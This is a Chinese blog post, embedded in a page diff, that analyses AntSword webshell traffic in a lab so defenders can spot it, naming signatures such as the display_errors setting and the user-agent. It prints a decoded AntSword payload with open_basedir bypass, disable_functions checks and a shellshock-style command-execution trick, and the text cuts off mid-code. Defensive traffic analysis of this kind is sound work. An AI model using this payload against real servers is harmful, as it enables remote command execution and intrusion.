@@ -1,0 +1,1870 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>webshell工具流量特征初探 | wh1t3zer</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">loading...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (href, before, media, attributes) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+      <h3 class="drawer-box-head_title">wh1t3zer</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">Tags</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/about" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-user" aria-hidden="true"></i>
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/friends" class="drawer-menu-item-link">
+                  
+                  <span class="name">友链</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="javascript:;" class="drawer-menu-item-link has-children" @click="openOrCloseMenu(6)">
+                  <span>
+                    
+                      <i class="fas fa-link"></i>
+                    
+                    <span class="name">更多</span>
+                  </span>
+                  <i class="fas fa-chevron-left arrow " :class="{'icon-rotate': isOpen(6)}" aria-hidden="true"></i>
+                </a>
+                <ul class="drawer-sub-menu" v-if="isOpen(6)">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/wh1t3zer">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">wh1t3zer</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="Tags">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">Tags</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/about" class="menu-item-link" title="关于">
+                  
+                    <i class="fas fa-user" aria-hidden="true"></i>
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/friends" class="menu-item-link" title="友链">
+                  
+                  <span class="name">友链</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="javascript:;" class="menu-item-link" title="更多">
+                  
+                    <i class="fas fa-link"></i>
+                  
+                  <span class="name">更多</span>
+                  <i class="fas fa-chevron-down arrow" aria-hidden="true"></i>
+                </a>
+                <ul class="sub-menu">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">Search</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="Please enter keywords"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/wh1t3zer" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/img2.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        webshell工具流量特征初探
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2023-12-02 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> category：
+          
+            <a href="/categories/webshell/" class="post-detail-header_category">
+              webshell
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>学习过程复习到了webshell攻防部分，没怎么深入了解过这一块，跟着网上一些博客去学习下各webshell工具的特征，对以后防守方去捕捉webshell流量有一定了解，还可以往上延伸webshell免杀的思路，以3个常见的webshell工具为例进行分析。前置准备：用XP面板。运行php环境和apache，写个一句话木马，用burp去抓包分析。</p>
+<h2 id="0x01蚁剑"><a href="#0x01蚁剑" class="headerlink" title="0x01蚁剑"></a>0x01蚁剑</h2><p>本人常用的工具就是蚂剑，里面可以安装一些大佬写的开源插件，一般较常用的有绕过disable_function、后渗透插件</p>
+<p>本次使用的是蚁剑的默认编码</p>
+<p>用蚁剑连接一句话马后，从数据包中看到里面有个ini_set(xxx)数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021631801.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021631801.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>再发送一段数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021634615.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021634615.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>可以看得出，蚁剑的基本的特征存在ini_set(“display_errors”, “0”)</p>
+<p>并且在老版本的蚁剑中user-agent默认是蚁剑头，在使用2.1.15中request.js文件中已经设置了nodejs官方随机的random-fake-useragent模块，但在update.js文件下，还存有Antsword的agent头</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021727869.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021727869.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>使用蚁剑终端的pwd命令查看下数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021728258.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021728258.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>解码下得到了代码，vs格式化不太好看，这样也能判断出大概的流程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">e054ebfc9bb446=EkY2QgIi9BcHBsaWNhdGlvbnMvcGhwc3R1ZHkvV1dXIjtwd2Q7ZWNobyBiNjE2MjE4M2E2NTtwd2Q7ZWNobyBlYTMzMQ==&amp;hack=@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);<span class="keyword">if</span>(<span class="variable">$opdir</span>)</span><br><span class="line">&#123;<span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());<span class="keyword">foreach</span>(<span class="variable">$oparr</span></span><br><span class="line"><span class="keyword">as</span> <span class="variable">$item</span>)</span><br><span class="line">&#123;<span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>))&#123;<span class="keyword">continue</span>;&#125;;<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.d3e0091ad95c&quot;</span>;@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);<span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>))&#123;<span class="keyword">continue</span>;&#125;<span class="variable">$tmdir</span>=<span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,</span><br><span class="line"><span class="string">&quot;..&quot;</span>);<span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);&#125;;@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;</span></span><br><span class="line"><span class="string">    /&quot;</span>);@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);<span class="keyword">break</span>;&#125;;&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">    <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();<span class="title function_ invoke__">ob_end_clean</span>();<span class="keyword">echo</span> <span class="string">&quot;efb&quot;</span> .<span class="string">&quot;fe3&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;a6d8ca&quot;</span></span><br><span class="line">    .<span class="string">&quot;411afd&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ve0a018006ce77&quot;</span>],<span class="number">2</span>));<span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;e054ebfc9bb446&quot;</span>],<span class="number">2</span>));<span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;yf44c9b536f58a&quot;</span>],<span class="number">2</span>));<span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span></span><br><span class="line">    ?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;<span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span> )&#123;@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>,</span><br><span class="line">    <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span> , <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span></span><br><span class="line">    ;<span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">    <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>,<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>)&amp;&amp;<span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>)&amp;&amp;!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">    <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>)==<span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span></span><br><span class="line">    (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span> ) !=<span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span>=<span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span> );<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;;</span></span><br><span class="line"><span class="string">    <span class="subst">$c</span>&gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;<span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;<span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span></span><br><span class="line">    False;&#125;<span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> True;&#125;&#125;<span class="keyword">return</span></span><br><span class="line">    False;&#125;;<span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">    <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(<span class="title function_ invoke__">fe</span>(<span 